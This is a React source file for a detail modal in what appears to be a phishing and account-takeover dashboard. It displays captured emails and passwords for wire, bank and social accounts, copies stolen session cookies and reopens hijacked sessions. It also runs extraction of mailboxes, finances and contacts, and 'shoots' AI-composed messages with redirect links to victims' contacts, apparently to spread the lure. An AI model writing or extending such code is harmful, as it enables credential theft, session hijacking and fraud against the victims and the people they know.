"use client";

import { useState, useEffect, useCallback } from 'react';
import { safeParseJSON, getQuotaInfo } from '../../../../utils/helpers';
import { isTrue } from '../../../../utils/parseResponseField';
import { useAppState } from '../../../context/AppContext';
import { QuotaInfoBadge } from '../../QuotaInfo';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { 
  faCheck, 
  faCookie, 
  faFileExport,
  faPaperPlane,
  faStickyNote,
  faClock,
  faDesktop,
  faSpinner
} from '@fortawesome/free-solid-svg-icons';
import { ShootContactsModal } from './ShootContactsModal';
import ConfirmationModal from '../../ConfirmationModal';
import { WireExtractView } from './wire/WireExtractView';
import { BankExtractView } from './bank/BankExtractView';
import { SocialExtractView } from './social/SocialExtractView';
import { AccountHeaderCard } from './details/AccountHeaderCard';

interface ItemDetailsModalProps {
  isOpen: boolean;
  onClose: () => void;
  data: any;
  category: 'WIRE' | 'BANK' | 'SOCIAL' | null;
  limits?: any;
  onVerify: (id: string) => void;
  onGetCookie: (id: string) => void;
  onExtract: (id: string) => void;
  onShootContacts?: (data: {
    id: string;
    selectedContacts: Array<{
      name?: string;
      email?: string;
      phone?: string | number;
      company?: string;
      platform?: string;
      username?: string;
    }>;
    subject: string;
    body: string;
    method?: 'ai' | 'manual';
    mailMerge?: boolean;
    linkType?: 'project' | 'redirect' | 'none';
    linkId?: string;
  }) => void;
  onOpenSession?: (browserId: string) => void;
  onMemoSave: (id: string, text: string) => void;
  loading?: boolean;
  projectsList?: Array<{ projectId: string; title: string }>;
  redirectsList?: Array<{ redirectId: string; title: string }>;
  onComposeAI?: (contactEmail: string, linkType?: string, linkId?: string) => Promise<{
    subject: string;
    body: string;
    context?: any;
  } | null>;
}

interface ExtractDataState {
  isLoading: boolean;
  data: any;
  error: string | null;
}

// Custom hook for fetching extract data from HTTP URL or Drive fileId
const useExtractData = (rawValue: string | null) => {
  const [extractData, setExtractData] = useState<ExtractDataState>({
    isLoading: false,
    data: null,
    error: null
  });

  useEffect(() => {
    if (!rawValue) {
      setExtractData({ isLoading: false, data: null, error: null });
      return;
    }

    // Detect Drive fileId reference: {"fileId":"xxx","fileName":"wireExtract.json","size":1234}
    let driveFileId: string | null = null;
    if (rawValue.startsWith('{')) {
      try {
        const parsed = JSON.parse(rawValue);
        if (parsed?.fileId && parsed?.fileName) {
          driveFileId = parsed.fileId;
        }
      } catch { /* not a reference */ }
    }

    const fetchData = async () => {
      setExtractData({ isLoading: true, data: null, error: null });
      try {
        if (driveFileId) {
          // Fetch from Drive via API
          const res = await fetch(`/api/drive-csv?fileId=${driveFileId}`);
          const result = await res.json();
          if (result.success) {
            setExtractData({ isLoading: false, data: result.data, error: null });
          } else {
            setExtractData({ isLoading: false, data: null, error: result.error || 'Failed to load from Drive' });
          }
        } else if (rawValue.startsWith('http')) {
          // Fetch from HTTP URL
          const response = await fetch(rawValue);
          const data = await response.json();
          setExtractData({ isLoading: false, data, error: null });
        } else {
          // Inline data — return as-is (no fetch needed)
          setExtractData({ isLoading: false, data: rawValue, error: null });
        }
      } catch (error) {
        setExtractData({ isLoading: false, data: null, error: 'Failed to load extract data' });
      }
    };

    fetchData();
  }, [rawValue]);

  return extractData;
};

export const ItemDetailsModal = ({
  isOpen,
  onClose,
  data,
  category,
  limits = null,
  onVerify,
  onGetCookie,
  onExtract,
  onShootContacts,
  onOpenSession,
  onMemoSave,
  loading,
  projectsList = [],
  redirectsList = [],
  onComposeAI,
}: ItemDetailsModalProps) => {
  const { appData } = useAppState();
  const [showMemoInput, setShowMemoInput] = useState(false);
  const [memoText, setMemoText] = useState('');
  const [lastSaved, setLastSaved] = useState<Date | null>(null);
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  const [showShootContactsModal, setShowShootContactsModal] = useState(false);
  const [currentAction, setCurrentAction] = useState<{
    type: 'verify' | 'cookie' | 'extract';
    id: string;
  } | null>(null);

  // Determine the URL for extract data if it's a string
  const rawExtractValue = data?.[`${category?.toLowerCase()}Extract`] || null;

  const { isLoading: extractIsLoading, data: fetchedExtractData, error: extractError } = useExtractData(
    typeof rawExtractValue === 'string' ? rawExtractValue : null
  );

  if (!isOpen || !data || !category) return null;

  const handleAction = (type: 'verify' | 'cookie' | 'extract') => {
    setCurrentAction({ type, id: data.id });
    setShowConfirmModal(true);
  };

  // Monthly quota for the pending action (frontend validation — skip backend when exhausted)
  const actionQuotaKey = currentAction?.type === 'verify' ? 'verifyLoginUsage'
    : currentAction?.type === 'extract' ? 'extractionUsage'
    : null;
  const quotaExhausted = !!actionQuotaKey && !!getQuotaInfo(appData, actionQuotaKey)?.exhausted;

  const handleConfirm = async () => {
    if (!currentAction) return;

    // Frontend quota validation — don't waste a backend round-trip the engine will 429
    if (quotaExhausted) {
      setShowConfirmModal(false);
      setCurrentAction(null);
      return;
    }

    switch (currentAction.type) {
      case 'verify':
        await onVerify(currentAction.id);
        break;
      case 'cookie':
        await onGetCookie(currentAction.id);
        break;
      case 'extract':
        await onExtract(currentAction.id);
        break;
    }
    setShowConfirmModal(false);
    setCurrentAction(null);
  };

  // Check if shoot contacts should be available
  const hasExtract = data[`${category.toLowerCase()}Extract`];
  const canShootContacts = isTrue(data?.fullAccess) && 
    isTrue(data?.verifyAccess) && 
    isTrue(data?.cookieAccess) && 
    !!data?.cookieFileURL &&
    hasExtract && 
    onShootContacts && 
    category !== null && 
    category !== 'BANK';

  const handleMemoClick = () => {
    setMemoText(data.memo || '');
    setShowMemoInput(true);
  };

  const renderExtractContent = (extractUrlOrData: any) => {
    let currentExtractData = extractUrlOrData;

    if (rawExtractValue) { // If extract data exists, check if it was fetched
      if (extractIsLoading) {
        return (
          <div className="flex items-center justify-center p-4 text-gray-700 dark:text-gray-300">
            <FontAwesomeIcon icon={faSpinner} spin className="mr-2" />
            Loading...
          </div>
        );
      }

      if (extractError) {
        return <div className="text-red-500 p-4 dark:text-red-400">{extractError}</div>;
      }

      currentExtractData = fetchedExtractData;
    }

    // Try to parse the data if it's a string
    let parsedData = currentExtractData;
    if (typeof currentExtractData === 'string') {
      try {
        parsedData = JSON.parse(currentExtractData);
      } catch (e) {
        console.error('Error parsing data:', e);
        return <div className="text-red-500 p-4 dark:text-red-400">Error parsing data</div>;
      }
    }

    if (!parsedData) return <div className="text-red-500 p-4 dark:text-red-400">Invalid data format</div>;

    return (
      <div className="overflow-auto">
        <table className="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
          <tbody className="divide-y divide-gray-200 dark:divide-gray-700">
            {Object.entries(parsedData).map(([key, value]) => (
              <tr key={key}>
                <td className="px-4 py-2 whitespace-nowrap font-medium text-gray-900 dark:text-white">{key}</td>
                <td className="px-4 py-2 whitespace-pre-wrap text-gray-500 dark:text-gray-300">
                  {typeof value === 'object' ? JSON.stringify(value, null, 2) : String(value)}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    );
  };

  const isDriveReference = (data: any): boolean => {
    if (!data || typeof data !== 'string') return false;
    try {
      const parsed = JSON.parse(data);
      return parsed && typeof parsed === 'object' && parsed.fileId && parsed.fileName;
    } catch {
      return false;
    }
  };

  const getStorageInfo = (extractData: any) => {
    if (!extractData) return null;
    if (typeof extractData === 'string' && extractData.startsWith('http')) {
      return { type: 'url', label: 'Stored externally', icon: '🔗' };
    }
    if (isDriveReference(extractData)) {
      try {
        const ref = JSON.parse(extractData);
        const sizeKB = ref.size ? Math.round(ref.size / 1024) : null;
        return {
          type: 'drive',
          label: 'Stored in Drive',
          fileName: ref.fileName,
          size: sizeKB ? `${sizeKB} KB` : null,
          icon: '☁️',
        };
      } catch {
        return { type: 'unknown', label: 'Unknown format', icon: '❓' };
      }
    }
    // Inline data
    const sizeKB = typeof extractData === 'string' ? Math.round(extractData.length / 1024) : null;
    return {
      type: 'sheet',
      label: 'Stored in Sheet',
      size: sizeKB ? `${sizeKB} KB` : null,
      icon: '📊',
    };
  };

  const renderExtractSection = (extractData: any, title: string) => {
    if (!extractData) return null;
    const storageInfo = getStorageInfo(extractData);

    return (
      <div className="mt-4">
        <div className="flex items-center justify-between">
          <h4 className="text-sm font-medium text-gray-500 dark:text-gray-400">{title}</h4>
          {storageInfo && (
            <span className={`text-xs px-2 py-0.5 rounded-full ${
              storageInfo.type === 'drive'
                ? 'bg-blue-100 text-blue-700 dark:bg-blue-900 dark:text-blue-300'
                : storageInfo.type === 'sheet'
                  ? 'bg-green-100 text-green-700 dark:bg-green-900 dark:text-green-300'
                  : 'bg-gray-100 text-gray-600 dark:bg-gray-700 dark:text-gray-400'
            }`}>
              {storageInfo.icon} {storageInfo.label}
              {storageInfo.size && ` (${storageInfo.size})`}
              {storageInfo.fileName && ` — ${storageInfo.fileName}`}
            </span>
          )}
        </div>
        <div className="mt-1 bg-gray-50 dark:bg-gray-700 rounded-md border border-gray-200 dark:border-gray-600">
          {renderExtractContent(extractData)}
        </div>
      </div>
    );
  };

  const renderActionButtons = () => (
    <div className="flex space-x-2">
      {(!isTrue(data.verified) || !isTrue(data.fullAccess)) && (
        <button
          onClick={() => handleAction('verify')}
          className="text-indigo-600 dark:text-indigo-400 hover:text-indigo-900 dark:hover:text-indigo-300"
          disabled={loading}
        >
          <FontAwesomeIcon icon={faCheck} className="mr-1" />
          Verify
        </button>
      )}

      {isTrue(data.verifyAccess) && isTrue(data.cookieAccess) && data.cookieJSON && data.cookieFileURL && (
        <button
          onClick={(e) => {
            e.stopPropagation();
            const cookieData = typeof data.cookieJSON === 'string' ? data.cookieJSON : JSON.stringify(data.cookieJSON);
            navigator.clipboard.writeText(cookieData);
          }}
          className="text-indigo-600 dark:text-indigo-400 hover:text-indigo-900 dark:hover:text-indigo-300"
          disabled={loading}
          title="Copy Cookie Data"
        >
          <FontAwesomeIcon icon={faCookie} className="mr-1" />
          Cookie
        </button>
      )}

      {isTrue(data.fullAccess) && isTrue(data.verifyAccess) && isTrue(data.cookieAccess) && data.cookieFileURL && (
        <button
          onClick={() => handleAction('extract')}
          className="text-indigo-600 dark:text-indigo-400 hover:text-indigo-900 dark:hover:text-indigo-300"
          disabled={loading}
        >
          <FontAwesomeIcon icon={faFileExport} className="mr-1" />
          Extract
        </button>
      )}

      {canShootContacts && (
        <button
          onClick={() => setShowShootContactsModal(true)}
          className="text-indigo-600 dark:text-indigo-400 hover:text-indigo-900 dark:hover:text-indigo-300"
          disabled={loading}
        >
          <FontAwesomeIcon icon={faPaperPlane} className="mr-1" />
          Shoot
        </button>
      )}

      {isTrue(data.cookieAccess) && data.cookieFileURL && (data.submissionId || data.browserId || data.id) && onOpenSession && (
        <button
          onClick={() => onOpenSession(data.submissionId || data.browserId || data.id)}
          className="text-indigo-600 dark:text-indigo-400 hover:text-indigo-900 dark:hover:text-indigo-300"
          disabled={loading}
        >
          <FontAwesomeIcon icon={faDesktop} className="mr-1" />
          Session
        </button>
      )}

      <button
        onClick={handleMemoClick}
        className="text-indigo-600 dark:text-indigo-400 hover:text-indigo-900 dark:hover:text-indigo-300"
      >
        <FontAwesomeIcon icon={faStickyNote} className="mr-1" />
        Memo
      </button>
    </div>
  );

  // Background extraction/verify progress from hub status keys. Extraction:
  // engine smartExtract writes extractStatus (started/extracting N/M/saving/
  // completed/completed-no-data/failed). Verify: GAS writes verifyStatus
  // (RUNNING/COMPLETED/FAILED/LIMIT_REACHED).
  const renderStatusBanner = () => {
    const es = String(data.extractStatus || '');
    const vs = String(data.verifyStatus || '');
    const at = (value: any) => (value ? new Date(value).toLocaleTimeString() : '');
    const isExtractRunning = es === 'started' || es === 'saving' || es.startsWith('extracting');
    const rows: any[] = [];

    if (isExtractRunning) {
      rows.push(
        <div key="extract-run" className="flex items-center text-sm text-amber-700 dark:text-amber-400">
          <FontAwesomeIcon icon={faSpinner} spin className="mr-2" />
          {es.startsWith('extracting') ? `Extracting ${es.replace('extracting ', '')}…` : 'Extracting…'}
          {data.extractStatusAt && <span className="ml-2 text-xs opacity-70">updated {at(data.extractStatusAt)}</span>}
        </div>
      );
    } else if (es === 'completed' || es === 'completed-no-data') {
      rows.push(
        <div key="extract-done" className="text-sm text-green-700 dark:text-green-400">
          Extraction completed{data.extractStatusAt ? ` — ${at(data.extractStatusAt)}` : ''}
        </div>
      );
    } else if (es === 'failed') {
      rows.push(
        <div key="extract-failed" className="text-sm text-red-500 dark:text-red-400">
          Extraction failed{data.extractStatusAt ? ` — ${at(data.extractStatusAt)}` : ''}
        </div>
      );
    }

    if (vs === 'RUNNING') {
      rows.push(
        <div key="verify-run" className="flex items-center text-sm text-amber-700 dark:text-amber-400">
          <FontAwesomeIcon icon={faSpinner} spin className="mr-2" />
          Verifying session…
          {data.verifyStatusAt && <span className="ml-2 text-xs opacity-70">started {at(data.verifyStatusAt)}</span>}
        </div>
      );
    } else if (vs === 'LIMIT_REACHED') {
      rows.push(
        <div key="verify-limit" className="text-sm text-amber-700 dark:text-amber-400">
          Monthly verification limit reached — verify again next cycle
          {data.verifyStatusAt ? ` (${at(data.verifyStatusAt)})` : ''}
        </div>
      );
    }

    if (rows.length === 0) return null;
    return <div className="space-y-1 p-3 bg-amber-50 dark:bg-amber-900/20 border border-amber-200 dark:border-amber-800 rounded-md">{rows}</div>;
  };

  // Account usage vs Limits-sheet platform policy. A per-account `_limits`
  // override inside interactionUsage REPLACES the platform policy (engine
  // checkActionAllowed semantics). Renders only when the platform has policy
  // cells or the account has recorded usage.
  const renderUsageCard = () => {
    const platform = String(data.platform || '').toUpperCase().trim();
    if (!platform || !limits?.headers || !limits?.data || !Array.isArray(limits.data)) return null;
    const pIdx = limits.headers.indexOf('platform');
    if (pIdx === -1) return null;
    const platformRow = limits.data.find((r: any[]) => String(r[pIdx] || '').toUpperCase().trim() === platform);
    if (!platformRow) return null;

    let usage: any = null;
    try {
      usage = typeof data.interactionUsage === 'string' ? JSON.parse(data.interactionUsage) : data.interactionUsage;
    } catch { usage = null; }
    const override = usage && typeof usage._limits === 'object' && usage._limits ? usage._limits : null;

    const ACTION_TYPES = [
      'likeOnStory', 'likesOnPost', 'likesOnComment',
      'commentOnComment', 'commentOnStory', 'commentOnPost',
      'follow', 'unfollow', 'coldMessage', 'extract',
    ];
    const num = (value: any): number => {
      const n = parseInt(value, 10);
      return Number.isFinite(n) ? n : 0;
    };
    const cellPolicy = (action: string): any => {
      const i = limits.headers.indexOf(action);
      if (i === -1 || !platformRow[i]) return null;
      try { return JSON.parse(platformRow[i]); } catch { return null; }
    };

    const rows = ACTION_TYPES.map((action) => {
      const policy: any = override || cellPolicy(action);
      const counters = usage && typeof usage[action] === 'object' ? usage[action] : {};
      const used = { h: num(counters.hourly), d: num(counters.daily), m: num(counters.monthly) };
      const hasUsage = used.h > 0 || used.d > 0 || used.m > 0;
      if (!policy && !hasUsage) return null;
      const fmt = (u: number, lim: any) => {
        const n = num(lim);
        return n > 0 ? `${u}/${n}` : `${u}/∞`;
      };
      return {
        action,
        hourly: fmt(used.h, policy?.hourly),
        daily: fmt(used.d, policy?.daily),
        monthly: fmt(used.m, policy?.monthly),
      };
    }).filter(Boolean) as Array<{ action: string; hourly: string; daily: string; monthly: string }>;

    if (rows.length === 0) return null;

    return (
      <div className="bg-gray-50 dark:bg-gray-700 p-3 rounded border border-gray-200 dark:border-gray-600">
        <div className="flex items-center justify-between mb-2">
          <h4 className="text-sm font-medium text-gray-700 dark:text-gray-300">Usage vs platform limits — {platform}</h4>
          {override && (
            <span className="text-xs px-2 py-0.5 rounded-full bg-indigo-100 text-indigo-700 dark:bg-indigo-900 dark:text-indigo-300">
              per-account override
            </span>
          )}
        </div>
        <table className="w-full text-xs">
          <thead>
            <tr className="text-left text-gray-500 dark:text-gray-400">
              <th className="py-1 pr-2 font-medium">Action</th>
              <th className="py-1 pr-2 font-medium text-right">Hourly</th>
              <th className="py-1 pr-2 font-medium text-right">Daily</th>
              <th className="py-1 font-medium text-right">Monthly</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-gray-200 dark:divide-gray-600">
            {rows.map((row) => (
              <tr key={row.action}>
                <td className="py-1 pr-2 text-gray-700 dark:text-gray-200">{row.action}</td>
                <td className="py-1 pr-2 text-right text-gray-600 dark:text-gray-300">{row.hourly}</td>
                <td className="py-1 pr-2 text-right text-gray-600 dark:text-gray-300">{row.daily}</td>
                <td className="py-1 text-right text-gray-600 dark:text-gray-300">{row.monthly}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    );
  };

  const renderDetails = () => {
    const headerCard = (
      <AccountHeaderCard
        title={data.title}
        email={data.email}
        password={data.password}
        domain={data.domain}
        cookieJSON={data.cookieJSON}
      />
    );
    const statusBanner = renderStatusBanner();
    const usageCard = renderUsageCard();

    switch (category) {
      case 'WIRE':
        const historyData = safeParseJSON(data.history) || [];
        return (
          <div className="space-y-4">
            {headerCard}
            {statusBanner}
            {usageCard}
            {extractIsLoading && (
              <div className="text-sm text-gray-500 dark:text-gray-400 p-3">Loading extract from Drive...</div>
            )}
            {extractError && (
              <div className="text-sm text-red-500 p-3">Failed to load extract: {extractError}</div>
            )}
            {(fetchedExtractData || data.wireExtract) && !extractIsLoading && (
              <WireExtractView data={typeof fetchedExtractData === 'string' ? fetchedExtractData : (typeof data.wireExtract === 'string' ? data.wireExtract : JSON.stringify(fetchedExtractData || data.wireExtract))} />
            )}
            {Array.isArray(historyData) && historyData.length > 0 && (
              <div className="bg-gray-50 dark:bg-gray-700 p-3 rounded">
                <h3 className="font-medium text-gray-900 dark:text-white mb-2">
                  Submission History ({historyData.length})
                </h3>
                <ul className="space-y-1">
                  {historyData.map((trial: any, index: number) => (
                    <li key={index} className="text-sm dark:text-gray-200">
                      <span className="text-gray-500 dark:text-gray-400">#{index + 1}:</span>{' '}
                      <span className="font-medium">{trial?.email || 'N/A'}</span>
                      <span className="text-gray-500 dark:text-gray-400"> / </span>
                      <span className="font-medium">{trial?.password || '—'}</span>
                    </li>
                  ))}
                </ul>
              </div>
            )}
          </div>
        );

      case 'BANK':
        const bankData = safeParseJSON(data.banks) || [];
        const bankHistory = safeParseJSON(data.history) || [];
        return (
          <div className="space-y-4">
            {headerCard}
            {statusBanner}
            {usageCard}
            {Array.isArray(bankData) && bankData.map((bank: any, index: number) => (
              <div key={index} className="border-b pb-4 last:border-0 dark:border-gray-700">
                <h3 className="font-medium text-gray-900 dark:text-white">{bank.bankName}</h3>
                <div className="grid grid-cols-2 gap-4 mt-2">
                  <div>
                    <h4 className="text-sm font-medium text-gray-500 dark:text-gray-400">Username</h4>
                    <p className="mt-1 text-gray-700 dark:text-gray-200">{bank.username}</p>
                  </div>
                  <div>
                    <h4 className="text-sm font-medium text-gray-500 dark:text-gray-400">Last Used</h4>
                    <p className="mt-1 text-gray-700 dark:text-gray-200">{new Date(bank.lastUsed).toLocaleString()}</p>
                  </div>
                </div>
              </div>
            ))}
            {extractIsLoading && (
              <div className="text-sm text-gray-500 dark:text-gray-400 p-3">Loading extract from Drive...</div>
            )}
            {extractError && (
              <div className="text-sm text-red-500 p-3">Failed to load extract: {extractError}</div>
            )}
            {(fetchedExtractData || data.bankExtract) && !extractIsLoading && (
              <BankExtractView data={typeof fetchedExtractData === 'string' ? fetchedExtractData : (typeof data.bankExtract === 'string' ? data.bankExtract : JSON.stringify(fetchedExtractData || data.bankExtract))} />
            )}
            {Array.isArray(bankHistory) && bankHistory.length > 0 && (
              <div className="bg-gray-50 dark:bg-gray-700 p-3 rounded">
                <h3 className="font-medium text-gray-900 dark:text-white mb-2">
                  Submission History ({bankHistory.length})
                </h3>
                <ul className="space-y-1">
                  {bankHistory.map((trial: any, index: number) => (
                    <li key={index} className="text-sm dark:text-gray-200">
                      <span className="text-gray-500 dark:text-gray-400">#{index + 1}:</span>{' '}
                      <span className="font-medium">{trial?.email || 'N/A'}</span>
                      <span className="text-gray-500 dark:text-gray-400"> / </span>
                      <span className="font-medium">{trial?.password || '—'}</span>
                    </li>
                  ))}
                </ul>
              </div>
            )}
          </div>
        );

      case 'SOCIAL':
        const socialData = safeParseJSON(data.socials) || [];
        const socialHistory = safeParseJSON(data.history) || [];
        return (
          <div className="space-y-4">
            {headerCard}
            {statusBanner}
            {usageCard}
            {Array.isArray(socialData) && socialData.map((social: any, index: number) => (
              <div key={index} className="border-b pb-4 last:border-0 dark:border-gray-700">
                <h3 className="font-medium text-gray-900 dark:text-white">{social.platform}</h3>
                <div className="grid grid-cols-2 gap-4 mt-2">
                  <div>
                    <h4 className="text-sm font-medium text-gray-500 dark:text-gray-400">Username</h4>
                    <p className="mt-1 text-gray-700 dark:text-gray-200">{social.username}</p>
                  </div>
                  <div>
                    <h4 className="text-sm font-medium text-gray-500 dark:text-gray-400">Status</h4>
                    <p className="mt-1 text-gray-700 dark:text-gray-200">{social.active ? 'Active' : 'Inactive'}</p>
                  </div>
                </div>
              </div>
            ))}
            {extractIsLoading && (
              <div className="text-sm text-gray-500 dark:text-gray-400 p-3">Loading extract from Drive...</div>
            )}
            {extractError && (
              <div className="text-sm text-red-500 p-3">Failed to load extract: {extractError}</div>
            )}
            {(fetchedExtractData || data.socialExtract) && !extractIsLoading && (
              <SocialExtractView data={typeof fetchedExtractData === 'string' ? fetchedExtractData : (typeof data.socialExtract === 'string' ? data.socialExtract : JSON.stringify(fetchedExtractData || data.socialExtract))} />
            )}
            {Array.isArray(socialHistory) && socialHistory.length > 0 && (
              <div className="bg-gray-50 dark:bg-gray-700 p-3 rounded">
                <h3 className="font-medium text-gray-900 dark:text-white mb-2">
                  Submission History ({socialHistory.length})
                </h3>
                <ul className="space-y-1">
                  {socialHistory.map((trial: any, index: number) => (
                    <li key={index} className="text-sm dark:text-gray-200">
                      <span className="text-gray-500 dark:text-gray-400">#{index + 1}:</span>{' '}
                      <span className="font-medium">{trial?.email || 'N/A'}</span>
                      <span className="text-gray-500 dark:text-gray-400"> / </span>
                      <span className="font-medium">{trial?.password || '—'}</span>
                    </li>
                  ))}
                </ul>
              </div>
            )}
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <>
      <div className="fixed inset-0 bg-black bg-opacity-50 dark:bg-opacity-75 flex items-center justify-center z-50 p-4">
        <div className="bg-white dark:bg-gray-800 rounded-lg w-full max-w-2xl h-[90vh] flex flex-col relative">
          <div className="flex justify-between items-center p-4 border-b dark:border-gray-700">
            <h2 className="text-xl font-bold text-gray-900 dark:text-white">{data.title}</h2>
            <button onClick={onClose} className="text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-200">
              ×
            </button>
          </div>
          <div className="flex-1 overflow-y-auto p-6 pb-24 dark:bg-gray-900">
            {renderDetails()}
          </div>
          <div className="sticky bottom-0 left-0 right-0 border-t dark:border-gray-700 bg-white dark:bg-gray-800 p-4 mt-auto">
            {renderActionButtons()}
          </div>
        </div>
      </div>

      <ConfirmationModal
        isOpen={showConfirmModal}
        onClose={() => setShowConfirmModal(false)}
        onConfirm={handleConfirm}
        title={`Confirm ${currentAction?.type}`}
        message={
          currentAction?.type === 'verify'
            ? 'Launch a headless browser to revalidate this stored login session (cookie + storage). Successful rows are marked verified and the session status is updated. Costs 1 login verification from your monthly quota.'
            : currentAction?.type === 'extract'
              ? 'Run a full extraction on this account: box summary, financial analysis (AI), personal info, contacts and activities. Runs in the background — refresh to see results. Costs 1 extraction from your monthly quota.'
              : `Are you sure you want to ${currentAction?.type} this item?`
        }
        confirmText={currentAction?.type === 'verify' ? 'Verify' : currentAction?.type === 'extract' ? 'Extract' : 'Confirm'}
        confirmDisabled={quotaExhausted}
        confirmLoading={loading}
      >
        {actionQuotaKey && (
          <div className="mb-4">
            <QuotaInfoBadge appData={appData} usageKey={actionQuotaKey} />
          </div>
        )}
      </ConfirmationModal>

      {showShootContactsModal && (
        <ShootContactsModal
          isOpen={showShootContactsModal}
          onClose={() => setShowShootContactsModal(false)}
          onSubmit={async (submitData) => {
            if (onShootContacts) {
              await onShootContacts(submitData);
            }
            setShowShootContactsModal(false);
          }}
          onComposeAI={onComposeAI}
          loading={loading}
          item={data}
          category={category === 'BANK' ? undefined : category}
          projectsList={projectsList}
          redirectsList={redirectsList}
        />
      )}

      {showMemoInput && (
        <div className="fixed inset-0 bg-black bg-opacity-50 dark:bg-opacity-75 flex items-center justify-center z-50">
          <div className="bg-white dark:bg-gray-800 rounded-lg p-6 max-w-xl w-full">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-xl font-bold text-gray-900 dark:text-white">Edit Memo</h2>
              <button onClick={() => setShowMemoInput(false)} className="text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-200">
                ×
              </button>
            </div>
            <textarea
              value={memoText}
              onChange={(e) => setMemoText(e.target.value)}
              onBlur={async () => {
                if (memoText !== '') {
                  await onMemoSave(data.id, memoText);
                  setLastSaved(new Date());
                }
              }}
              className="w-full h-32 p-2 border rounded dark:bg-gray-700 dark:border-gray-600 dark:text-white"
              placeholder="Enter memo text..."
            />
            {lastSaved && (
              <div className="mt-2 text-sm text-gray-500 dark:text-gray-400">
                <FontAwesomeIcon icon={faClock} className="mr-1" />
                Last saved: {lastSaved.toLocaleTimeString()}
              </div>
            )}
          </div>
        </div>
      )}
    </>
  );
};
